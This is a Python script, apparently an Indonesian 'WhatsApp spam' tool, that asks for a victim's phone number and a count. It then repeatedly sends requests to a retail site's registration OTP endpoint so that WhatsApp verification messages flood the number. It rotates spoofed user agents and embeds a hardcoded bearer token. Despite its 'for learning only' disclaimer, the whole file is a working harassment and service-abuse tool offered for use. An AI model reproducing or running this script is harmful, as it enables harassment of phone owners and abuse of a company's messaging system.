import requests, json, os, time,random
import sys
os.system ("clear")
print ("\033[0;32m__        __   _")
print ("\033[0;32m\ \      / /__| | ___ ___  _ __ ___   ___")
print ("\033[0;32m \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ |")
print ("\033[0;32m  \ V  V /  __/ | (_| (_) | | | | | |  __/")
print ("\033[0;32m   \_/\_/ \___|_|\___\___/|_| |_| |_|\___|")
print("\033[0;32m\n—————————————————————————————————————————————————")
print ("\033[0;33m\n——————————————}TOOLS SPAM WHATSAPP{——————————————")
print ("\033[0;33m\n—————————————————}ILOVE U PYTHON{————————————————")
print ("\033[0;32m\n—————————————————————————————————————————————————")
try:
  print ("\033[0;32m∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞")
  print ("\ntools ini di buat untuk tujuan pembelajaran saja \ndan open source agar kalian bisa mengedit dan \nbisa belajar program python\n \nBy: MRX.41 TEAM SYBER JATIM INDONESIA\n—————————————————————————————————————————————————")
  
  
  s = 0
  nomer = int(input("\nenter-number :"))
  print ("\n")
  jumlah = int(input("amount :"))
  
  print ("\033[0;32m∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞")
  def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.1)
  mengetik ("\nwaiting ...")
  print ("\n")
  ### (masukan user agen di bawah jika mau menambah USER AGENT)
  user = random.choice (["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-A225F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 GNews Android/2022146282","TuneIn Radio/26.0.0; iPad13%2C8; iPadOS/16.5.1","Mozilla/5.0 (Linux; 12; SM-A047F) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A528B) AppleWebKit/537.36 (KHTML%2C like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; CPH1931 Build/QKQ1.200209.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.227 Mobile Safari/537.36 GNews Android/2022143610","Mozilla/5.0 (Linux; Android 9; FIG-LA1 Build/HUAWEIFIG-LA1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 GNews Android/2022143610",])
  ######(silahkan ganti Host headers jika POGRAM sudah invalid atau sudah tidak bisa di pakai lagi)
  headers =  {
"Host": "beryllium.mapclub.com",
"Connection": "keep-alive",
"Content-Length": "25",
"Client-Platform": "WEB",
"DNT": "1",
"Client-Timestamp": "1710610881775",
"Accept-Language": "in-ID",
"sec-ch-ua-mobile": "?1",
"Authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiIwMjgyYmMzZC03NjdhLTQ0MWItYjQyMS1lMzhlZTA2MzkxMmIiLCJleHBpcmVkIjoxNzEwNjE0MzEwODQ4LCJleHBpcmUiOjM2MDAsImV4cCI6MTcxMDYxNDMxMCwiaWF0IjoxNzEwNjEwNzEwLCJwbGF0Zm9ybSI6IldFQiJ9.F66c6I0Tud5vRfL-xFaanEhfFv7TBoTdz8T76NPzU_Ix3cZ1kyXMk12D4aNQhCGloSiyvkqMwVma_L8W0fxnqQ",
"User-Agent": user,
"Content-Type": "application/json",
"Accept": "application/json, text/plain, */*",
"sec-ch-ua-platform": "Android",
"Origin": "https://www.mapclub.com",
"Sec-Fetch-Site": "same-site",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://www.mapclub.com/",
"Accept-Encoding": "gzip, deflate, br, zstd",

    
  }
  data = json.dumps({"account":"0"+str(nomer)})
  for i in range(jumlah):
    s += 1
    pos = requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=WHATSAPP",headers=headers,data=data).text

    if "success" in pos:
      ###(silahan ubah limit di bawah kalau anda ingin memodifnya kembali)
      time.sleep (2)
      print ("\033[0;33m[√] Successfully brim :",s)
    
    else:
      print ("\033[0;31 [×] Spam failed !",s)

except ValueError:
  hadi = ("\033[0;31m \n[x] The code you entered is wrong !\n")
  print (hadi)
  
except:
  dini = ("\033[0;31m \n[x] Troubled-network !")
  print (dini)